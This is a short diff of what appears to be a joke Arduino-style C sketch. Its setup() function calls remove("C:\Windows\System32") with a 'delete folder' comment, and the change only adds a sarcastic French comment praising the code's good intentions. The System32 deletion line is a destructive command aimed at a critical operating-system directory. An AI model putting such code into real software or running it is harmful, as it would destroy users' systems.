@@ -8,4 +8,4 @@ void setup() {
   remove("C:\Windows\System32"); // delete folder. It's so that
   
 }
-void loop() {}
+void loop() {} //J'aime bien ce code, il est très detaillé et c'est clair il a été fait avec de l'amour et des bonnes intentions...
